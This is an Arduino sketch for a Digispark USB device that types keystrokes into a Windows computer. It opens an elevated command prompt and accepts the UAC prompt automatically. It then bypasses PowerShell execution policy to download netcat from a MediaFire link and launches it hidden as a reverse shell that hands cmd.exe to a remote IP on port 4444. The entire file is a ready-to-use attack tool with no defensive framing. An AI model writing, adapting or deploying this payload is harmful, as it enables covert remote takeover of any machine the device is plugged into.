#include "DigiKeyboard.h"

void setup() {
  //empty
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd / & mkdir win & cd /win & echo (wget 'https://download1640.mediafire.com/sm7sxbe154fg/kjflwyvxh42vk0g/nc64.exe' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("START /min a.exe IP HERE 4444 -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
